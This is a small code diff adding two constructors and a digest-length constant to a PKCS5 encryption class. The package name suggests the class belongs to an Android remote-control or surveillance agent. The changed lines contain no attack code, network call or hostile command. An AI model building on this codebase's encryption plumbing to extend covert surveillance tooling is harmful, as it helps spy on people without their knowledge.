@@ -7,7 +7,15 @@ import com.ht.RCSAndroidGUI.utils.Check;
 import com.ht.RCSAndroidGUI.utils.Utils;
 
 public class EncryptionPKCS5 extends Encryption {
-    private static final int DIGEST_LENGTH = 20;
+    public EncryptionPKCS5(byte[] key) {
+		super(key);
+	}
+
+	public EncryptionPKCS5() {
+		super(Keys.self().getAesKey());
+	}
+
+	private static final int DIGEST_LENGTH = 20;
 	//#ifdef DEBUG
     private static Debug debug = new Debug("EncryptionPKCS5"
             );
@@ -143,4 +151,6 @@ public class EncryptionPKCS5 extends Encryption {
             throw new CryptoException();
         }
     }
+
+
 }
